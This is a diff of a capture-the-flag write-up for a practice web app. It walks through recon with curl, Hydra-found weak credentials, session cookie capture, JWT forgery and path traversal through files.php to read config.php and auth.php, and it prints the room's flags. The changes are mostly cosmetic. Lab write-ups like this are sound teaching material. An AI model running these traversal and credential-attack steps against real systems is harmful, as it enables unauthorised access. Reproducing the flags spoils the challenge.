@@ -71,7 +71,7 @@ Finished
 ===============================================================
 ```
 
-Inspect `index.php` to discover the username format `firstname.lastname`.
+Inspect `/index.php` to discover the username format `firstname.lastname`.
 
 ```html
 root@ip-ATTACKER_IP:~# curl -X GET http://TARGET_IP/index.php 
@@ -139,7 +139,7 @@ root@ip-ATTACKER_IP:~# curl -X POST http://TARGET_IP/index.php -d 'username=test
 </html>
 ```
 
-Inspect `team.php` to discover employee emails and usernames.
+Inspect `/team.php` to discover employee emails and usernames.
 
 ```html
 root@ip-ATTACKER_IP:~# curl -X GET http://TARGET_IP/team.php 
@@ -149,20 +149,6 @@ root@ip-ATTACKER_IP:~# curl -X GET http://TARGET_IP/team.php
 <meta charset=UTF-8>
 <title>NexusCorp - Our Team</title>
 <link rel=stylesheet href=/static/style.css>
-<style>
-.team-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1.5rem; margin-top: 2rem; }
-.team-card { background: #1a1d2e; border: 1px solid #2d3148; border-radius: 12px; padding: 1.5rem; }
-.team-card .avatar { width: 56px; height: 56px; border-radius: 50%; background: #6c63ff; display: flex; align-items: center; justify-content: center; font-size: 1.4rem; font-weight: 700; color: white; margin-bottom: 1rem; }
-.team-card h3 { font-size: 1rem; font-weight: 600; color: #e2e8f0; margin-bottom: 0.25rem; }
-.team-card .role { font-size: 0.82rem; color: #6c63ff; margin-bottom: 0.5rem; }
-.team-card .dept { font-size: 0.8rem; color: #64748b; margin-bottom: 0.75rem; }
-.team-card .email { font-size: 0.82rem; color: #94a3b8; font-family: monospace; }
-.team-card .email a { color: #94a3b8; text-decoration: none; }
-.team-card .email a:hover { color: #6c63ff; }
-.page-header { border-bottom: 1px solid #2d3148; padding-bottom: 1rem; margin-bottom: 0.5rem; }
-.page-header h1 { font-size: 1.6rem; }
-.page-header p { color: #64748b; font-size: 0.9rem; margin-top: 0.4rem; }
-</style>
 </head>
 <body>
 <nav class=navbar>
@@ -263,7 +249,7 @@ robert.wilson
 sarah.johnson
 ```
 
-Inspect `backup/README.txt` to discover the path to a decryption key reference and `AES-ECB-128` configuration.
+Inspect `/backup/README.txt` to discover the path to a decryption key reference and `AES-ECB-128` configuration.
 
 ```bash
 root@ip-ATTACKER_IP:~# curl -X GET http://TARGET_IP/backup/README.txt
@@ -273,7 +259,7 @@ config.enc  - Encrypted application configuration (AES-128-ECB)
 Decryption key reference: see static/app.js (deployment notes)
 ```
 
-Inspect `static/app.js` to discover the decryption key `N3xusK3y2024!!`, which is padded from 14 to 16 bytes with two `NULL` bytes (`0x00`) according to offset `0x160`.
+Inspect `/static/app.js` to discover the decryption key `N3xusK3y2024!!`, which is padded from 14 to 16 bytes with two `NULL` bytes (`0x00`) according to offset `0x160`.
 
 
 ```properties
@@ -420,7 +406,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at
 Ignoring false-positives from empty password attempts, `username=emma.taylor&password=password` (Product Manager), `username=robert.wilson&password=password` (DevOps Engineer), and `username=sarah.johnson&password=password` (Senior Software Engineer) are all valid credential pairs. Based off of their roles, the latter two are more likely to possess elevated privileges. Try logging in as `robert.wilson` and make sure to save his session cookie.
 
 ```html
-root@ip-ATTACKER_IP:~# curl -c cookies.txt -b cookies.txt -iLX POST http://TARGET_IP/index.php -d 'username=robert.wilson&password=password'
+root@ip-ATTACKER_IP:~# curl -c cookies.txt -b cookies.txt -LiX POST http://TARGET_IP/index.php -d 'username=robert.wilson&password=password'
 HTTP/1.1 302 Found
 Date: Mon, 09 Nov 2026 13:15:22 GMT
 Server: Apache/2.4.58 (Ubuntu)
@@ -667,7 +653,7 @@ root@ip-ATTACKER_IP:~# cat cookies.txt
 TARGET_IP	FALSE	/	FALSE	0	nexus_session	eyJ1c2VyX2lkIjo0LCJ1c2VybmFtZSI6InJvYmVydC53aWxzb24iLCJyb2xlIjoidXNlciJ9.06633788837d4525fc57614def8718cf061a8374b95120eb93aedfd74eb4cee3
 ```
 
-Inspect `support/create.php` to discover nothing out of the ordinary.
+Inspect `/support/create.php` to discover nothing out of the ordinary.
 
 ```bash
 root@ip-ATTACKER_IP:~# curl -b cookies.txt -X GET http://TARGET_IP/support/create.php
@@ -798,7 +784,7 @@ Content-Type: text/html; charset=UTF-8
 
 The captured flag is **THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}**.
 
-> [!INFO]
+> [!NOTE]
 > The forged JWT token from Path 1 can be used to verify the XSS vulnerability from Path 2 by inspecting `/support/create.php`. 
 > ```php
 > <?php
@@ -959,7 +945,7 @@ The captured flag is **THM{rf1_2_rc3_f00th0ld_fl4g3}**.
 
 ###  What is the flag found in the devops user's home directory? 
 
-Inspect `config.php` to discover database configuration and the secrets used for signatures. 
+Inspect `/config.php` to discover database configuration and the secrets used for signatures. 
 
 ```php
 root@ip-ATTACKER_IP:~# curl -b cookies.txt -H "Authorization: Bearer $ADMINTOKEN" -sX GET http://TARGET_IP/api/files.php?name=../config.php | jq -r '.content'
@@ -979,7 +965,7 @@ function get_db() {
 ?>
 ```
 
-Inspect `auth.php` to determine how the newly discovered secrets are used. The JWT generation function contains a bug that hardcodes the `role` claim to `user`, regardless of the account's actual privileges, hence Path 1. More importantly, signature verification in `verify_jwt()` has been commented out, allowing modified token claims to be accepted without a valid signature. Although the session signing secret has also been recovered, modifying the session cookie's `role` claim is insufficient to escalate privileges because the application retrieves the user's actual `role` from the database rather than trusting the cookie value.
+Inspect `/auth.php` to determine how the newly discovered secrets are used. The JWT generation function contains a bug that hardcodes the `role` claim to `user`, regardless of the account's actual privileges, hence Path 1. More importantly, signature verification in `verify_jwt()` has been commented out, allowing modified token claims to be accepted without a valid signature. Although the session signing secret has also been recovered, modifying the session cookie's `role` claim is insufficient to escalate privileges because the application retrieves the user's actual `role` from the database rather than trusting the cookie value.
 
 ```php
 root@ip-ATTACKER_IP:~# curl -b cookies.txt -H "Authorization: Bearer $ADMINTOKEN" -sX GET http://TARGET_IP/api/files.php?name=../auth.php | jq -r '.content'
